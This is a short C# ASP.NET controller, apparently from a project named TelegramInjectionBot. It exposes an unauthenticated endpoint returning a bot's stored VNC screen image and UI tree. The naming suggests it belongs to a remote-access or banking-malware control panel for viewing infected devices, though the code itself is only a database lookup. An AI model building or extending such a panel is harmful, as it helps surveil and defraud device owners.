using Microsoft.AspNetCore.Mvc;
using TelegramInjectionBot.Data;

// using TelegramInjectionBot.Data;

namespace TelegramInjectionBot.Controllers;

[ApiController]
[Route("[controller]/[action]")]
public class TelegramBotController : ControllerBase
{
    private readonly EFContext context;

    public TelegramBotController(IServiceProvider provider)
    {
        context = provider.CreateScope().ServiceProvider.GetRequiredService<EFContext>();
    }

    [HttpGet]
    [Route("/vnc/{botId}")]
    public IActionResult Test(string botId)
    {
        var vncs = context.BotVncs
            .Where(botLog => botLog.BotId == botId)
            .ToList();

        if (vncs.Count < 1) return Ok("not found");

        var vnc = vncs.First();


        return Ok(new
        {
            success = true,
            payload = new
            {
                botId = vnc.BotId,
                tree = vnc.Tree,
                screen = vnc.ImageBlob
            }
        });
    }
}